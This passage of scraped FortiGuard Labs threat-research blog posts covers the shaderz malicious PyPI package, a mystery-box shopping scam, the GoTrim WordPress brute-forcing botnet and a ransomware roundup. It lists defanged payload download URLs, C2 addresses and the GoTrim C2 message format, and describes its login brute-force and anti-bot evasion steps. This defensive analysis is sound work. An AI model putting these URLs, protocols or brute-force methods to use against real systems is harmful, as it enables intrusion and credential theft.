8124cec491e0249bc4a9f3f9d3755201b0e8c28068ce8c4b528217dbb94afd13 FortiGuard Labs responsibly disclosed the malicious aioconsol package to Python and it has been removed. threat research,FortiGuards Labs,threat analysis,python FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/new-supply-chain-attack-uses-python-package-index-aioconsol"
  },
  {
    "title": "Supply Chain Attack via New Malicious Python Package, “shaderz” (Part 2)",
    "content": "FortiGuard Labs Threat Research In this second part of our Shaderz zero-day analysis, we look closely at its downloaded executables. Refer toPart Oneof this blog for more background. To start, we found that this is a multi-stage attack: 1.     Stage one – Connect to a suspicious URL to download the executable ‘stub.exe’ using setup.py found in the package 2.     Stage two – ‘stub.exe’ downloads another executable called ‘main.exe’ 3.     Stage three – executing ‘main.exe’ As we look deeper into the first executable, ‘stub.exe’, we find that it is a 64-bit PyInstaller compiled executable (Python version 3.11). We observed key behaviors from the disassembled Python byte code of ‘stub.exe’ shown below. The ‘main.exe’ executable downloaded from URL hxxps://cdn[.]discordapp[.]com/attachments/1045000289708687390/1045158219024171169/main[.]exe is saved to ‘%USER%\\AppData\\Roaming\\Microsoft\\Windows\\Themes\\screen.scr’. It then runs the executable: We can also see it sets autorun for this downloaded executable at startup. The second downloaded executable is where the more malicious behavior happens. Similar toPart Oneof this blog, the download URL https://cdn[.]discordapp[.]com/attachments/1045000289708687390/1045158219024171169/main[.]exe includes the following binary exe (SHA 256): d1f0583169acde756793d7d5d69afbb72331c931a88749eab14f28ecda3ef5ce As with the previous executable, this download URL has not previously been detected by any other threat researchers. However, some vendors flag this downloaded executable file as malicious, as shown below. This executable is also a 64-bit PyInstaller compiled executable (Python version 3.11). As shown below, it uses a powerful Python obfuscator called Hyperion in its Python byte code. One suspicious behavior conducted by ‘main.exe’ is creating a series of text and DB files in the ‘%USERPROFILE%\\AppData\\Local\\Temp’ folder. It then stealthily records sensitive user data and credentials. When we look into any of these text files, we see that the malware names itself ‘Subliminal Stealer.’ Let’s take a look at the DB files below. We can safely assume that they are used for saving sensitive data and credentials, such as credit card and log-in information. Individuals need to be wary of installing python packages in the wild as they may have potential malicious behaviors hidden within. As this blog series demonstrates, malware authors are often able to use what seems like a benign package to prey on victims. We will continue monitoring new open-source packages and report malicious packages to help prevent users from becoming victims of a supply chain attack. FortiGuard AntiVirus detects the malicious executable identified in this report as W64/Agent.7EC7!tr The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Customers running current AntiVirus updates are protected. The FortiGuard Web Filtering Service detects it as malicious and blocks the download URL cited in this report. d1f0583169acde756793d7d5d69afbb72331c931a88749eab14f28ecda3ef5ce cdn[.]discordapp[.]com/attachments/1045000289708687390/1045158219024171169/main[.]exe Learn more about Fortinet’sFortiGuard Labsthreat research and global intelligence organization and Fortinet’s FortiGuard AI-powered Security Servicesportfolio.Sign upto receive our threat research blogs. threat research,FortiGuards Labs,threat analysis,zero-day research,python FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/supply-chain-attack-via-new-malicious-python-package-shaderz-part-2"
  },
  {
    "title": "Want to Know What’s in That Online Mystery Box? NOTHING AT ALL",
    "content": "FortiGuard Labs Threat Research The holidays are upon us, and in some parts of the world, the month of December (especially in North America) is when many retailers earn the bulk of their revenue. Because the holiday season includes gift giving and sales on desirable merchandise, individuals tend to spend more money than average. At the same time, retailers, small businesses, and mom-and-pop stores also spend more money to stock their shelves. Affected Platforms:N/AImpacted Parties:Online ShoppersImpact:Loss of personally identifiable information and/or moneySeverity Level:Low Because the online marketplace is so competitive, many online retailers offer free shipping and returns during this period. But with increased sales comes an increase in returns and exchanges. The volume of online returns has been increasing steadily over the past five years. Online returns jumped from10.6% in 2020 to 16.6% in 2021—an overall $761 billion dollar increase. This year, however, many online retailers have curtailed these benefits,citing inflation and lower profits. But despite this change, when combined with the sheer volume of sales in brick-and-mortar stores, the number of returns is still expected to rise. And rather than repackaging these items for resale, many returns are sent to logistic companies that bundle and sell them in bulk, often for pennies on the dollar. This has created a burgeoning second-hand market.  These outlets usually resell returns, overstocks, slightly damaged, and used items purchased in bulk from retailers nationwide, often at a steep discount. These stores provide a benefit for the consumer and the environment since many returned products otherwise often end up being incinerated or tossed into a landfill. Shoppers have been flocking to these new sites looking for great deals on holiday purchases. And as you might expect, scammers and bad actors have also seized on this trend. OurFortiGuard Labsteam has uncovered a growing number of scams related to the resale of used or returned items. The example below emphasizes the need to be cyber-aware this shopping season, whether you are purchasing something for yourself, a loved one, or your business. One common technique for reselling returned and overstocked items is to sell mystery items in large boxes or pallets. Social media is filled with videos showing excited consumers opening pallets that contain items of significant value, like iPhones and computers, that were purchased online for a few hundred dollars. These posts have contributed to the interest and frenzy. Many of these are scams. The sheer amount of interest, demonstrated by the volume of trending hashtags on social media, has created an opportunity for threat actors to try and capitalize on unknowing victims. One such scam seeing rapid growth is the Amazon pallet scam, also known as mystery boxes, bulk return pallets, etc. The following example is a paid advertisement we recently came across on the default Microsoft start page built into Windows 10: Clicking on the top left advertisement, “Amazon’s unclaimed high-end electronics mystery boxes are being sold at bar [sic],” takes us to the website fundelivereddss[.]com: The landing page appears convincing to the untrained eye, showing a large warehouse with brown boxes stacked on pallets: The viewer is then presented with an interstitial (an inserted web page that displays advertising) that highlights someone in “Conroe” who purchased a return tool pallet only a minute after visiting the site: Clicking on the interstitial brings us to the following page: The intended victim is presented with several options and brands to choose from, including size, quantity, and price: Typical red flags seen on scam sites are grammatical errors, typos, the misuse of punctuation and spacing, inconsistent logos, etc. This is often due to the fact that the scammers are trying to get their site online as fast as possible to start making money or that the bad actors are non-native English speakers. In this case, we can see that the phrase “Customer Review(40)” at the top of the pages is missing pluralization and does include a space between the word “Review” and the parentheses symbol: The first review also contains a fragmented and incoherent review that indicates that the writer is likely a non-native speaker: It's great to witness his arrival together at this moment. I recommend this store, please don't buy from other stores because I fell down in other places. Some forensics analysis of the photo shows it was taken from Twitter from an electrical contractor based in the United States: Another clue is that the domain fundelivereddss[.]com was only registered on October 29th.  Recently registered domains are often hallmarks of a potential scam, popping up and then disappearing in time with an event, such as the holidays or the World Cup. Threat actors also know that search engine ranking for their new site will be low, so they use social media promotion to get these sites in front of potential victims. Another clue we observed was found within the privacy policy page. It includes a reference to herbertm[.]shop. This indicates that this template was likely reused by the same actor. To test this theory, we visited herbertm[.]shop to see what it contains. This page appears to be selling fashion items. However, we also see a floating interstitial that appears to be the last chance to order what appears to be Amazon returns: When viewing the link, we found it contains Amazon and EBay references: Amazon and eBay backlog, picking, liquidation 【Temporary sale】 (herbertm[.]shop) https://www.herbertm[.]shop/products/products-amazon-and-ebay-backlog-picking-liquidation-temporary-sale?sales_pop=true&spm=..index.0.1 Unfortunately, when we clicked on the link, we found that the page no longer exists, so at this point we don’t have any evidence that this was another pallet scam. However, the pattern used in the herbertm[.]shop and Fundelivereddss[.]com sites and the cross-reference between the two in the privacy policy indicates these were set up by the same perpetrators. So we kept looking. While a Google cache disn’t provide us with any clues, looking at scamadviser.com revealed negative reviews from victims of herbertm[.]shop that make the connection clearer: It appears that some victims of the herbertm[.]shop scam site ordered large pallets as well as individual items. And it also appears from the complaints that some victims were offered a bait and switch. For example, some that had ordered a specific item only had a cheap unrelated item sent to them. And for the pallet scams, one victim stated they only received a video game controller instead of the pallet, and another claimed to have ordered two pallets for $89.98 but did not receive anything. Creating professional-looking websites has never been easier.  Many eCommerce platforms come preconfigured with design templates, shopping carts, and payment gateways. Because of this, sites can literally be online within moments. Gone are the barriers that required a retailer to know how to develop a website, figure out how to plug in a payment gateway, and design or incorporate shopping carts into a website. Even the need to work with a bank to process credit cards has been replaced with third-party services that handle billing, simplifying the process for both the entrepreneur and scammer alike. Things to watch out for when shopping online: When shopping online, there are a number of things you need to check, especially if the site you are shopping at is not a well-known brand. Domain age. If the domain is less than a few months old, the likelihood that it is a scam website is very high. Many search engines penalize new sites and will not rank them, which means you likely arrived there through some sort of phishing scam. Older sites tend to be owned by more reputable companies, meaning they are less likely to be scams (unless the domain has expired). They are also ranked higher due to the fact that it takes investment to keep a site up and running, so they show up first when running an online search for an item. Promoted on social media or paid advertisements.This is another giveaway. Just because an advertisement is on a major social media platform or search engine does not mean it is legitimate. Often, advertisements on a page are curated by a third party. Using this strategy, combined with hashtags and other keywords curated for their target audience, helps create a sense of credibility that allows bad actors to connect with their victims. It Is also a lot easier to market to victims this way if thire site is new. Outlandish claims.“This is not a scam!” “You will not regret it!” Phrases like these are psychological ploys designed to create FOMO, or fear of missing out, in their victims. Do your own due diligence when purchasing items from lesser-known sellers. Grammatical issues.This is a major red flag.  Legitimate sites, especially those intending to stay in business, employ copy editors to ensure proper grammar, punctuation, and spelling. Although not necessarily always true (mistakes do happen), egregious grammatical errors in web copy often indicate it was written by someone who is not a native speaker, which is a warning sign that warrants further investigation. Unusually low prices.Unusually low pricing is often another warning sign. How likely is it that a retailer like Amazon would be willing to let go of thousands of dollars’ worth of high-end products for less than ten percent of their value? High-value items may end up in unsorted returns, but it is rare. And unlike the claims in Figure 6, these returns are usually not collated by brand. Instead, their inclusion is often random and items are returned in various conditions. All websites mentioned in this blog are blocked by theFortiGuard Web Filtering client. Fortinet Web Filtering includes two filtering categories that can be used to protect against newly created pages: -       Newly Registered Domain            Domains that were very recently registered -       Newly Observed Domain              Domains that are newly configured or newly active, but not necessarily newly registered. By enabling blocking of these sites, you can avoid exploitation by sites with little or no reputation. Learn more about Fortinet’sFortiGuard Labsthreat research and global intelligence organization and Fortinet’s FortiGuard AI-powered Security Servicesportfolio.Sign upto receive our threat research blogs. holiday shopping,FortiGuards Labs,online shopping,scams Industry Trends FortiGuard Labs Threat Research Industry Trends Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/want-to-know-whats-in-that-online-mystery-box-nothing-at-all"
  },
  {
    "title": "GoTrim: Go-based Botnet Actively Brute Forces WordPress Websites",
    "content": "FortiGuard Labs Threat Research FortiGuard Labsrecently encountered a previously unreported Content Management System (CMS) scanner and brute forcer written in the Go programming language (also commonly referred to as Golang). We took a closer look at this malware because it was being described in several online forums as being installed in compromised WordPress sites, but there were no publicly available analysis reports. Golang brute forcers are not new. For example, we previously reported on theStealthWorkercampaign in 2019. This new brute forcer is part of a new campaign we have named GoTrim because it was written in Go and uses “:::trim:::”to split data communicated to and from the C2 server. Similar to StealthWorker, GoTrim also utilizes abot networkto perform distributed brute force attacks. The earliest sample we found was from Sep 2022. That campaign is still ongoing at the time of writing. This article details how this active botnet scans and compromises websites using WordPress and OpenCart. We also highlight some differences between samples collected from Sep to Nov 2022 at the end of the article. GoTrim uses a bot network to perform distributed brute force attacks against its targets. Each bot is given a set of credentials to use to attempt to log into a long list of website targets. After a successful login, a bot client is installed into the newly compromised system. It then awaits further commands from the threat actors, thereby expanding the bot network. GoTrim only reports credentials to the C2 server after a successful brute force attempt. We did not observe any code in GoTrim for propagating itself or deploying other malware. However, we did find PHP scripts that download and execute GoTrim bot clients. It seems likely that the threat actor is somehow abusing compromised credentials to deploy PHP scripts to infect systems with GoTrim. Typically, each script downloads the GoTrim malware from a hardcoded URL to a file in the same directory as the script itself and executes it. To cover its tracks, both the downloader script and GoTrim brute forcer are deleted from the infected system. It does not maintain persistence in the infected system. Analysis detailed in this article is based on a sample with SHA-256 hash c33e50c3be111c1401037cb42a0596a123347d5700cee8c42b2bd30cdf6b3be3, unless stated otherwise. GoTrim is built with Go version 1.18. As with all Go applications, all third-party libraries used in the code are statically linked to the malware, resulting in a relatively bigger file size for the executable binary. But this has the advantage of not depending on any external files to execute correctly. To solve the size issue, the malware is packed using UPX to reduce the file from 6 MB to 1.9 MB. Another advantage of using Go is that the same source code can be cross-compiled to support different architectures and Operating Systems. Based on the source code paths in the samples, Windows was used during the development of GoTrim. However, we have only observed samples targeting 64-bit Linux in the wild. GoTrim can communicate with its Command and Control (C2) server in two ways: a client mode, where it sends HTTP POST requests to the Command and Control (C2 server), or a server mode, where it starts an HTTP server to listen for incoming POST requests. All data exchanged with the C2 is encrypted using the Advanced Encryption Standard in Galois Counter Mode (AES-GCM) with a key derived from a passphrase embedded in the malware binary. By default, GoTrim attempts to run in server mode if the infected malware is directly connected to the Internet—that is, if the victim's outbound orlocal IP addressis non-private. Otherwise, it switches to client mode. Upon execution, GoTrim creates an MD5 hash representing a unique identification for the infected machine (bot ID). This is generated from the following string containing several pieces of information delimited by the “:” character: VICTIM_EXTERNAL_IP:HTTP_SERVER_PORT:1:OUTBOUND_IP:AES_PASSPHRASE After generating the bot ID, GoTrim creates an asynchronous Go routine (similar to multithreading) that sends a beacon request to the C2 server on both client and server modes. The C2 request URLs change between versions, as discussed in a later section of this article. For this particular sample, the beacon request URL is “/selects?dram=1”. In this beacon request, several pieces of victim and bot information are sent to the C2 server, as seen in Figure 3. Some of the interesting fields sent in the beacon request include the following: 1.Bot ID: unique ID for the bot2.External IP: public IP address of the victim machine3.HTTP Server Port: randomly generated port for the HTTP server (0 in client mode)4.Malware Initialization Flag: always set to 1 by the time this request is made5.Outbound IP: local IP address of the victim machine6.Status Message: The “GOOD” message is replaced by other strings that report the status of any running CMS detection or brute forcing tasks during subsequent beacon requests.7.Status Flags: These indicate whether the malware currently has any processing tasks assigned by the C2 server and the IDs of these tasks8.MD5 Checksum: This value is generated from parts of the above request and the hardcoded AES passphrase. It serves as a message integrity checksum. The fields are joined together with the:::trim:::string, hence the name chosen for this campaign. The data is then encrypted using an AES-256-GCM key, the SHA-256 hash of the previously mentioned passphrase. The server usually responds with “OK”, “404 page not found”, or “BC”, all encrypted with the same AES-GCM key. When “BC” is received, GoTrim will regenerate its bot ID and switch from server to client mode. The first beacon request is to register a new bot (victim) to the bot network. After each beacon request, GoTrim sleeps between a few seconds to several minutes, depending on the C2 server response and whether the malware is currently working on C2-assigned tasks before sending the next request. The malware regularly performs this beacon request to update the C2 server about the bot's status, including successful credentials, as discussed in the brute forcing section of the article. If GoTrim fails to receive a valid response from the C2 server after 100 retries, it will terminate itself. While the beacon requests are being sent asynchronously to update the C2 server on its status, GoTrim either sends a request to the C2 server to receive commands (client mode) or sets up an HTTP server to listen for incoming tasking requests (server mode). In client mode, the malware sends a POST request to “/selects?bilert=1” to receive commands from the C2 server. The C2 server responds with the command encrypted with the same AES-GCM key. An example of a decrypted command can be seen below in Figure 4. After splitting the data by the “:::trim:::” string, seven fields can be identified, as listed below. 1.MD5 Checksum: used for checking message integrity, e.g., 83217f8b39dccc2f9f2a0157f0236c4f2.Command ID: This indicates the command for the current task3.Concurrency Level: This affects how many goroutines are executed for each task4.Command Options: This contains options for the commands, separated by 7E 6A 71 6D 70 C2 A9 (~jqmp©) bytes. They are interpreted differently depending on the command: a.Target List: This is GZIP-compressed data, which, when decompressed, contains a list of domains that will be the target for the login attempts.b.Command Option 1(redacted): This option contains the username for authentication commands. Instead of using the same username for each domain, the C2 server can specify a series of bytes, like C2 A9 64, to use the domain as the username.c.Command Option 2(redacted): For authentication commands, this option contains the passwordd.Command Option 3: Unknown option for WordPress authenticatione.Command Option 4: Option for WordPress authentication to use either POST request or XML-RPC when submitting credentials. 5.Internal Values: Numeric values that are not used by the malware itself (e.g.,42and255) and likely represent internal tasking IDs for the current command. The malware supports the following commands: We have observed a target list containing up to 30,000 domains in a single WordPress authentication command. Additionally, we observed that authentication commands only provide a single password to test against all the domains in the list. As mentioned above, brute forcing is likely distributed by commanding a network of infected machines to test different domains and credentials. After the malware has completed processing a command, it sleeps for a while before sending another POST request to receive a new task from the C2 server. In server mode, GoTrim starts a server on a random port between 4000 to 7999 to respond to incoming POST requests sent by the threat actor. This mode gives the threat actor a more responsive way of communicating with the bot. For instance, the status of the bots can be checked by the threat actor without waiting for the subsequent beacon request by simply sending a POST request to a specific URL handled by the bot’s HTTP server. To issue a command to the machine, the threat actor sends a POST request to “/BOT_ID?lert=1” with the body containing the AES-256-GCM encrypted command data, similar to the response provided by the C2 server when the client requests commands (Figure 4). Server mode supports the same commands as client mode. The threat actor can also send a request with the parameter \"/BOT_ID?intval=1” to view the status of currently running tasks and whether assigned tasks have been completed. When CPU utilization is below a certain level (75% or 90%, depending on the number of concurrent workers used for the current task), a separate goroutine is spawned to process each domain. GoTrim attempts to identify whether one of the four CMSes (WordPress, Joomla!, OpenCart, or DataLife Engine) is being used on the target website. It does this by checking for specific strings in the webpage content. Interestingly, it only targets self-hosted WordPress websites by checking the Referer HTTP header for “wordpress.com”. As managed WordPress hosting providers, such as wordpress.com, usually implement more security measures to monitor, detect, and block brute forcing attempts than self-hosted WordPress websites, the chance of success is not worth the risk of getting discovered. The strings used for determining the installed CMS are listed below. WordPress Joomla! OpenCart DataLife Engine While GoTrim can detect websites using the four CMSes above, it currently only supports authenticating against WordPress and OpenCart websites. This indicates that this botnet is still under development. Aside from the username provided by the C2 server, it attempts to gather more usernames by sending a GET request to “/wp-json/wp/v2/users”. After that, it tries to log in to the WordPress website using the list of usernames and the password provided in the C2 command by sending a POST request to “/wp-login.php”. Figure 5 shows an example of the POST request for logging in. This request causes a redirect to the admin page of the WordPress website (i.e.,/wp-admin) after a successful login. To confirm that the login and redirection were successful, it checks to see if the response contains “id=\\\"adminmenumain\\”. The C2 server can also specify the authentication to be performed via the WordPress XML-RPC feature, which is another way for users to programmatically interact with the CMS remotely using XML. By communicating directly with the web server’s backend, anti-bot mechanisms such as captchas that usually work when accessing the website pages could be bypassed. After a successful login, the following information (delimited by “|”) is updated into a global status message and sent with the following request to the C2 (client mode) or in the response to incoming requests (server mode): GoTrim can also brute force websites running the open-source e-commerce platform OpenCart. It sends a GET request to the target’s “/admin/index.php” and collects the authentication-related tokens and headers needed for the login request. It then performs the actual authentication by sending a POST request to the same URL with form-encoded data containing the username and the password. To verify that the login request was successful, it checks if the website returned an OpenCart user token by searching for “/dashboard&user_token=” and making sure the “redirect” value from the received data is not empty. A valid authentication response should look like the following: {\"redirect\":\"https://example.com/opencart/admin/index.php?route=common/dashboard&user_token=USER_TOKEN_HASH\"} Upon successful login, the global status message is updated for WordPress brute-forcing. GoTrim can detect anti-bot techniques used by web hosting providers and CDNs, such as Cloudflare and SiteGround, and evade some of their simpler checks. It tries to mimic legitimate requests from Mozilla Firefox on 64bit Windows by using the same HTTP headers sent by the browser and supporting the same content encoding algorithms: gzip, deflate, and Brotli. For WordPress websites, it also detects whether CAPTCHA plugins are installed. The malware contains code to solve the CAPTCHA for some of these plugins. However, we need to verify if the bypass techniques work. We determined that it cannot bypass Google, WP Limit Login Attempts, and Shield Security’s CAPTCHAs. In general, for the security plugins it cannot bypass, it only reports them to the C2 server by updating the global status message with information similar to the data it sends during a successful login. But it uses “3GOOD” for the brute force status to indicate that credential validation was skipped. On encountering websites that contain the string “1gb.ru” within the page content, GoTrim also sends the same “3GOOD” brute force status. This appears to be a conscious decision to avoid targeting websites hosted by this provider, but the intent remains unclear. While searching for other samples related to this campaign, we found a PHP script and binary from September 2022 with different URLs “/selects?param=1” and “/selects?walert=1” on C2 server 89[.]208[.]107[.]12 (Figure 6). The PHP script we detect as PHP/GoTrim!tr.dldr uses the same installation method, with only the download URL varying across the samples we gathered. A version of the binary that appeared in November 2022 also updated its HTTP POST URLs (Figure 7). The beacon request URL “/selects?dram=1” and the command request URL “/selects?bilert=1” have been changed to “/route?index=1” and “/route?alert=1”, respectively. The encryption algorithm and keys used in the data transmission remain the same. Although this malware is still a work in progress, the fact that it has a fully functional WordPress brute forcer combined with its anti-bot evasion techniques makes it a threat to watch for—especially with the immense popularity of the WordPress CMS, which powers millions of websites globally. Brute-forcing campaigns are dangerous as they may lead to server compromise and malware deployment. To mitigate this risk, website administrators should ensure that user accounts (especially administrator accounts) use strong passwords. Keeping the CMS software and associated plugins up to date also reduces the risk of malware infection by exploiting unpatched vulnerabilities. FortiGuard Labs will continue to monitor GoTrim’s development. The FortiGuard Antivirus service detects and blocks this threat asELF/GoTrim!trandPHP/GoTrim!tr.dldr. TheFortiGuard AntiVirusservice is supported byFortiGate,FortiMail,FortiClient, andFortiEDR, and the Fortinet AntiVirus engine is a part of each of those solutions. Customers running current AntiVirus updates are protected. FortiGuard Labs provides theGoTrim.BotnetIPS signature against GoTrim C2 activity. TheFortiGuard Web FilteringService blocks the C2 servers and download URLs cited in this report. FortiGuard IP Reputation and Anti-Botnet Security Serviceproactively block these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. Files 646ea89512e15fce61079d8f82302df5742e8e6e6c672a3726496281ad9bfd8a 4b6d8590a2db42eda26d017a119287698c5b0ed91dd54222893f7164e40cb508 c33e50c3be111c1401037cb42a0596a123347d5700cee8c42b2bd30cdf6b3be3 71453640ebf7cf8c640429a605ffbf56dfc91124c4a35c2ca6e5ac0223f77532 3188cbe5b60ed7c22c0ace143681b1c18f0e06658a314bdc4c7c4b8f77394729 80fba2dcc7ea2e8ded32e8f6c145cf011ceb821e57fee383c02d4c5eaf8bbe00 De85f1916d6102fcbaceb9cef988fca211a9ea74599bf5c97a92039ccf2da5f7 2a0397adb55436efa86d8569f78af0934b61f5b430fa00b49aa20a4994b73f4b Download URLs hxxp://77[.]73[.]133[.]99/taka hxxp://77[.]73[.]133[.]99/trester hxxp://77[.]73[.]133[.]99/pause C2 hxxp://77[.]73[.]133[.]99 hxxp://77[.]73[.]133[.]99/selects?dram=1 hxxp://77[.]73[.]133[.]99/selects?bilert=1 hxxp://77[.]73[.]133[.]99/route?index=1 hxxp://77[.]73[.]133[.]99/route?alert=1 hxxp://89[.]208[.]107[.]12 hxxp://89[.]208[.]107[.]12/selects?param=1 hxxp://89[.]208[.]107[.]12/selects?walert=1 brute force attack,wordpress,FortiGuards Labs,botnet FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/gotrim-go-based-botnet-actively-brute-forces-wordpress-websites"
  },
  {
    "title": "Supply Chain Attack via New Malicious Python Package, “shaderz” (Part 1)",
    "content": "FortiGuard Labs Threat Research Our Fortinet Advanced Research Team recently discovered a 0-day attack in a PyPI package (Python Package Index) called “shaderz”. It was discovered on December 6, 2022, through a system we use to monitor open-source ecosystems. This Python package was published on December 2, 2022, as shown in its official PyPI repository. Our suspicions were initially raised because it only has one published version, 0.0.1, and does not include a clear description of the package, the author’s email, or its source page. The package includes malicious code in its setup.py installation script that downloads and runs an executable file as a part of its installation. One particularly interesting element is the URL, which requires deeper analysis: https://cdn[.]discordapp[.]com/attachments/1045000289708687390/1045159487079723058/stub.exe. As shown in the VirusTotal entry below, the download URL includes the following binary exe (SHA 256):33df1d9c50a9bd9d3e71dc61c0a7f41f7ca51612e9c3babcea927adde169e62d. While this download URL has not previously been detected by any other threat researchers, some vendors do flag the downloaded executable file as malicious. The downloaded executable seems to be a python script compiled into an executable file. We will share more details of our analysis of this file in our next post. We will continue to monitor and help organizations defend against malicious packages found in the wild like this one to help protect our customers against attacks from unknown sources. For more detail,read part 2of this blog. FortiGuard AntiVirus detects the malicious executable identified in this report as W32/PossibleThreat The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Customers running current AntiVirus updates are protected. The FortiGuard Web Filtering Service detects as malicious and blocks the download URL cited in this report. shaderz-0.0.1[.]tar[.]gz fd9f944fafb58faf783fdf4f8638d281a429b84cdb119756e6d7d92b31a079de stub.exe 33df1d9c50a9bd9d3e71dc61c0a7f41f7ca51612e9c3babcea927adde169e62d Malicious URLs cdn[.]discordapp[.]com/attachments/1045000289708687390/1045159487079723058/stub[.]exe Learn more about Fortinet’sFortiGuard Labsthreat research and global intelligence organization and Fortinet’s FortiGuard AI-powered Security Servicesportfolio.Sign upto receive our threat research blogs. threat information sharing,threat intelligence,advanced threat protection,threat analysis,python FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/supply-chain-attack-new-malicious-python-package-shaderz"
  },
  {
    "title": "Ransomware Roundup – New Vohuk, ScareCrow, and AERST Variants",
    "content": "FortiGuard Labs Threat Research On a bi-weekly basis,FortiGuard Labsgathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report aims to provide readers with brief insights into the evolvingransomwarelandscape and the Fortinet solutions that protect against those variants. This latest edition of the Ransomware Roundup covers Vohuk, ScareCrow, and AERST ransomware. Affected platforms:Microsoft WindowsImpacted parties:Microsoft Windows UsersImpact:Encrypts files on the compromised machine and demands ransom for file decryptionSeverity level:High Like most ransomware, the new Vohuk variant encrypts files on compromised machines and tries to extort money from victims. Its dropped ransom note, “README.txt”, asks victims to contact the attacker via email with a unique ID assigned to each victim. As seen in the ransom note, this Vohuk ransomware variant is version 1.3, potentially indicating that the attacker has updated the ransomware several times. Files encrypted by Vohuk ransomware have a “.Vohuk” file extension. It also replaces file icons with a red lock icon. The ransomware also replaces the desktop wallpaper with its own. The ransomware leaves a distinctive mutex, “Global\\\\VohukMutex”, which prevents different instances of Vohuk ransomware from running on the same system. Based on the file submission locations to VirusTotal, Vohuk ransomware has primarily affected Germany and India. ScareCrow is another typical ransomware that encrypts files on victims’ machines. Its ransom note, also titled “readme.txt”, contains three Telegram channels that victims can use to speak with the attacker. While no financial demand is requested in the ransom note, victims will most likely be asked to pay ransom to recover their encrypted files. At the time of this writing, those three Telegram channels were unavailable. ScareCrow ransomware appears to have some similarities with the infamous Conti ransomware: both use the CHACHA algorithm to encrypt files and delete shadow copies using wmic based on shadow copy IDs. This is not all that surprising because the Conti ransomware source code was reportedly leaked earlier in the year. However, the ScareCrow threat actor put some effort into developing this ransomware variant, as our analysis found some significant differences. For example, Conti encrypts all command strings with one decryption routine, whereas ScareCrow encrypts every string, including the name of the DLLs it loads (i.e., kernel32), the name of the APIs it uses, and even the command strings with its own decryption routine. ScareCrow ransomware adds a “.CROW” file extension to affected files. ScareCrow ransomware files were submitted to VirusTotal from Germany, India, Italy, the Philippines, Russia, and the United States. This indicates that this ransomware is relatively widespread, albeit by using unknown infection vectors. AESRT is a new ransomware strain that FortiGuard Labs recently came across. It encrypts files on compromised machines and appends an “.AESRT” file extension to the files it encrypts. Instead of leaving a ransom note, the ransomware displays a popup window that includes the attacker’s email address. It also accepts a field to enter the purchased key required to decrypt the ransomed files. The ransomware also deletes shadow copies, which inhibits the victim’s ability to recover files. Fortinet customers are already protected from these malware variants through FortiGuard’s AntiVirus and FortiEDR services, as follows: FortiGuard Labs detects known Vohuk, ScareCrow, and AESRT ransomware variants with the following AV signatures: Vohuk ransomware ScareCrow ransomware AESRT ransomware Vohuk ransomware ScareCrow ransomware AESRT ransomware Due to the ease of disruption, damage to daily operations, potential impact to an organization’s reputation, and the unwanted destruction or release ofpersonally identifiable information (PII), etc., it is vital to keep all AV and IPS signatures up to date. Since the majority of ransomware is delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREENSE training:NSE 1 – Information Security Awarenessincludes a module on internet threats designed to help end users learn how to identify and protect themselves from various types of phishing attacks and can be easily added to internal training programs. Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack. As part of the industry's leading fully integratedSecurity Fabric, delivering integration and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings. These services are powered by our global FortiGuard team of seasoned cybersecurity experts. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because payment does not guarantee that files will be recovered. According to aU.S. Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3). FortiGuard Labs’Emergency Incident Response Serviceprovides rapid and effective response when an incident is detected. And ourIncident Readiness Subscription Serviceprovides tools and guidance to help you better prepare for a cyber incident through readiness assessments, IR playbook development, and IR playbook testing (tabletop exercises). Learn more about Fortinet’sFortiGuard Labsthreat research and intelligence organization and the FortiGuard AI-powered securityservices portfolio. ransomware,Ransomware Roundup,variant,FortiGuards Labs,threat analysis FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/ransomware-roundup-new-vohuk-scarecrow-and-aerst-variants"
  },
  {
    "title": "cyber war middle east",
